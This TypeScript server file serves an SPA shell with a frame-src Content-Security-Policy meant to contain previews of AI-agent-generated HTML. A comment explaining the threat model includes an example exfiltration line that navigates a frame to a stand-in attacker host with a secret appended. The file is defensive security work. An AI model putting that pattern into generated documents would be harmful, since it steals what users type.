// SPDX-License-Identifier: Apache-2.0

/**
 * The SPA document itself — `index.html` with `window.__APP_CONFIG__` injected,
 * served for every non-asset route.
 *
 * It lives here rather than inline in `index.ts` for one reason: the response
 * carries a security header whose value is derived from env, and `apps/web/dist`
 * is a build artefact that does not exist in a test run — so the handler needs a
 * seam (`readIndexHtml`) to be covered by a test at all. See
 * `test/integration/routes/spa-csp.test.ts`.
 */

import type { Handler } from "hono";
import { getEnv } from "@appstrate/env";
import type { AppEnv } from "../types/index.ts";

const INDEX_HTML = "./apps/web/dist/index.html";

/**
 * The SPA document's `Content-Security-Policy` — **one directive, `frame-src`**,
 * naming the single origin the platform embeds: the document-preview origin.
 *
 * This is the parent-side half of the agent-HTML preview containment. The
 * preview response's own CSP cannot close the NAVIGATION channel: its
 * `sandbox allow-scripts` denies the document an origin, but a sandboxed
 * navigable may ALWAYS navigate ITSELF (the sandboxed-top-level-navigation flags
 * gate navigating an ANCESTOR only), and `connect-src` / `form-action` do not
 * cover navigation. So an agent document rendered in the SPA's preview modal
 * could be a fake login form that ships what the user typed out by replacing its
 * own frame — `location = "https://evil.example/?p=" + secret`.
 *
 * `frame-src` on the PARENT document bounds where that frame is allowed to go.
 * Measured in Chrome against this exact header: a nested frame's attempt to
 * navigate itself to an origin outside the list is blocked with **no network
 * request to the target**, while the frame's legitimate initial load succeeds.
 *
 * What this closes is every cross-origin NAVIGATION out of the frame. It is not
 * a general exfiltration control — see `buildPreviewCsp` in
 * `apps/api/src/services/document-preview.ts` for the named WebRTC/STUN
 * residual, which no header here or on the preview response covers.
 *
 * It also does not stop the frame navigating WITHIN the allowed origin, and what
 * that residual amounts to differs by mode:
 *
 *  - `USERCONTENT_URL` mode: the allowed origin serves nothing but token-bound
 *    preview bytes, so the frame can only reach the trust level it already had.
 *  - DEFAULT mode: the emitted value is `frame-src 'self'` — the WHOLE app
 *    origin, i.e. the SPA, `/api/*`, `/login`. The frame may navigate itself to
 *    any app-origin page. That is still not an exfiltration channel: the frame is
 *    opaque-origin (the preview response's CSP `sandbox`), so SameSite cookies
 *    are not sent on such a navigation, and `frame-src` is re-enforced ACROSS A
 *    302 — measured in Chrome — so an open redirect on the app origin cannot
 *    launder the navigation back out to an attacker's host.
 *
 * A path-scoped `frame-src <appOrigin>/preview/documents/` would tighten the
 * default mode further. Deliberately not taken: `'self'` tracks whatever origin
 * actually served this document, while a path source expression has to spell out
 * a scheme + host, so it silently stops matching — and the preview frame silently
 * stops loading — the moment `APP_URL` or the proxy in front of it drifts.
 *
 * Deliberately NOT a full SPA CSP: no `script-src`, no `default-src`, nothing
 * else. The Vite build bootstraps the app from inline markup, so a `script-src`
 * here would break the page; hardening the whole document is a separate project.
 * A directive appearing next to `frame-src` is therefore a regression, and a test
 * pins that.
 *
 * @returns `frame-src <preview-origin>` — the `USERCONTENT_URL` origin when the
 *   instance serves previews from a separate domain, else `'self'` (previews are
 *   minted on `APP_URL`, the same origin as this document).
 */
export function buildSpaCsp(): string {
  const usercontent = getEnv().USERCONTENT_URL;
  const previewOrigin = usercontent ? new URL(usercontent).origin : "'self'";
  return `frame-src ${previewOrigin}`;
}

/**
 * SPA fallback handler. `index.html` is read fresh on every request because
 * `vite build --watch` rewrites it with new asset hashes; the CSP is derived
 * ONCE here, at boot, since env cannot change under a running process.
 *
 * @param buildAppConfigScript Produces the `<script>` injecting
 *   `window.__APP_CONFIG__`. Per-request by design — `bootstrapTokenPending`
 *   flips the moment an unattended install is claimed.
 * @param readIndexHtml Reads the built SPA shell. Overridden in tests only.
 */
export function createSpaFallbackHandler(
  buildAppConfigScript: () => string,
  readIndexHtml: () => Promise<string> = () => Bun.file(INDEX_HTML).text(),
): Handler<AppEnv> {
  const csp = buildSpaCsp();
  return async (c) => {
    const raw = await readIndexHtml();
    return c.html(raw.replace("</head>", `${buildAppConfigScript()}\n</head>`), 200, {
      "Content-Security-Policy": csp,
    });
  };
}
